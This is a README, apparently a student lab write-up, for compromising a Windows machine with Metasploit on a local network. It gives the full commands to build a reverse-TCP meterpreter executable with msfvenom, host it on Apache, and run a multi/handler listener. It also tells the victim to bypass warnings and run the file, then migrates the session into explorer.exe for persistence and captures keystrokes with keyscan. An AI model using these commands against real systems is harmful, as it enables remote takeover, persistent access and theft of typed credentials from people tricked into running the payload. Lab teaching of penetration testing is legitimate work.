# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig

## OUTPUT:

![Screenshot 2024-04-24 083309](https://github.com/kanagavel7/Compromising-windows-using-Metasploit/assets/162578954/ecf969db-aadb-442e-80e6-cb8c52a2fd57)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:

![Screenshot 2024-04-24 083358](https://github.com/kanagavel7/Compromising-windows-using-Metasploit/assets/162578954/1e457aef-1191-441c-b4b1-2c23802c6e00)

copy the fun.exe into the apache /var/www/html folder

## OUTPUT:

![Screenshot 2024-04-24 083508](https://github.com/kanagavel7/Compromising-windows-using-Metasploit/assets/162578954/eb315bc1-979f-46da-9c17-5c468a25be64)

Start apache server sudo systemctl apache2 start

## OUTPUT:

![Screenshot 2024-04-24 083540](https://github.com/kanagavel7/Compromising-windows-using-Metasploit/assets/162578954/1279d483-bf51-4947-b117-f771b3625e6b)

Check the status of apache2

## OUTPUT:

![Screenshot 2024-04-24 083647](https://github.com/kanagavel7/Compromising-windows-using-Metasploit/assets/162578954/378f2394-d6e6-43cb-9484-75fe1d0ea54a)

Invoke msfconsole:

## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![Screenshot 2024-04-24 083808](https://github.com/kanagavel7/Compromising-windows-using-Metasploit/assets/162578954/89fde685-ac81-4dfd-a4c7-bde9265dfdd4)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![Screenshot 2024-04-24 083849](https://github.com/kanagavel7/Compromising-windows-using-Metasploit/assets/162578954/7894f039-2c76-47ef-a58a-485989f6a127)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![Screenshot 2024-04-24 083917](https://github.com/kanagavel7/Compromising-windows-using-Metasploit/assets/162578954/ff306f73-11a8-46ec-be65-24acaf6cb7c5)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![Screenshot 2024-04-24 084002](https://github.com/kanagavel7/Compromising-windows-using-Metasploit/assets/162578954/50debf1f-d924-4a85-8f12-a70c2ea1da1e)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![Screenshot 2024-04-24 084044](https://github.com/kanagavel7/Compromising-windows-using-Metasploit/assets/162578954/fab1602f-8ac9-4058-a685-ecec3281a3e6)

keyscan_dump Shows the keystrokes captured so far

![Screenshot 2024-04-24 084121](https://github.com/kanagavel7/Compromising-windows-using-Metasploit/assets/162578954/5b526710-12b7-4748-980e-fa7c8bca41bb)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
